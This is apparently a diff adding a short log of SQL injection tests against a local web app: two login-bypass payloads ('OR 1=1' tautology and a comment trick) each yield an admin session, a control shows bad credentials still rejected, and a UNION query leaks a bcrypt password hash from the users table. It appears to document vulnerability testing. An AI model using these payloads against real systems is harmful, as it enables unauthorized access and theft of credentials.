@@ -1,0 +1,14 @@
+### 1) Login bypass with tautology  admin' OR '1'='1
+  POST /login -> HTTP 302, redirect=http://localhost:3200/
+  session identity after bypass: Hi, admin
+
+### 2) Login bypass with comment  admin'--
+  POST /login -> HTTP 302, redirect=http://localhost:3200/
+  session identity after bypass: Hi, admin
+
+### 3) Control: wrong creds are still rejected
+  POST /login (baduser/badpass) -> HTTP 401
+
+### 4) UNION read of users table via search
+  LEAKED password hash from users table via UNION:
+    $2b$12$p4v1D/boz8DuQQ87m/pP.eLYEiB/.7WyGzWRhKRMd/Yq.dPI5VcOe
